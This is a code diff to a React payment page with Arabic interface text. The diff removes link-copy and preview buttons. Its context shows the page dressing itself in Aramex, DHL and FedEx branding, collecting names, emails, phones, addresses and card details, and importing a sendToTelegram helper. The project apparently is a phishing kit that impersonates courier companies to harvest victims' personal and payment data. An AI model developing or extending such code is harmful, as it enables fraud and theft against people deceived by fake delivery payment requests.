@@ -9,8 +9,7 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
-import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin, Copy, ExternalLink } from "lucide-react";
-import { useToast } from "@/hooks/use-toast";
+import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -29,13 +28,11 @@ import heroBg from "@/assets/hero-bg.jpg";
 const PaymentRecipient = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { toast } = useToast();
   const { data: linkData } = useLink(id);
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
-  const [copied, setCopied] = useState(false);
   
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -122,25 +119,6 @@ const PaymentRecipient = () => {
     navigate(`/pay/${id}/details`);
   };
   
-  const handleCopyLink = () => {
-    // نسخ نفس الرابط الحالي
-    const currentUrl = window.location.href;
-    
-    navigator.clipboard.writeText(currentUrl);
-    setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
-    toast({
-      title: "تم النسخ!",
-      description: "تم نسخ الرابط إلى الحافظة",
-    });
-  };
-  
-  const handlePreview = () => {
-    // فتح نفس الرابط الحالي في تبويب جديد
-    const currentUrl = window.location.href;
-    window.open(currentUrl, '_blank');
-  };
-  
   return (
     <>
       <PaymentMetaTags 
@@ -187,40 +165,6 @@ const PaymentRecipient = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
-            
-            {/* Copy and Preview buttons */}
-            <div className="mb-4 flex gap-2 justify-end">
-              <Button
-                type="button"
-                onClick={handleCopyLink}
-                variant="outline"
-                size="sm"
-                className="bg-white shadow-md"
-              >
-                {copied ? (
-                  <>
-                    <Copy className="w-4 h-4 ml-2" />
-                    تم النسخ!
-                  </>
-                ) : (
-                  <>
-                    <Copy className="w-4 h-4 ml-2" />
-                    نسخ رابط المشاركة
-                  </>
-                )}
-              </Button>
-              
-              <Button
-                type="button"
-                onClick={handlePreview}
-                variant="outline"
-                size="sm"
-                className="bg-white shadow-md"
-              >
-                <ExternalLink className="w-4 h-4 ml-2" />
-                معاينة
-              </Button>
-            </div>
             
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
               <form onSubmit={handleProceed}>
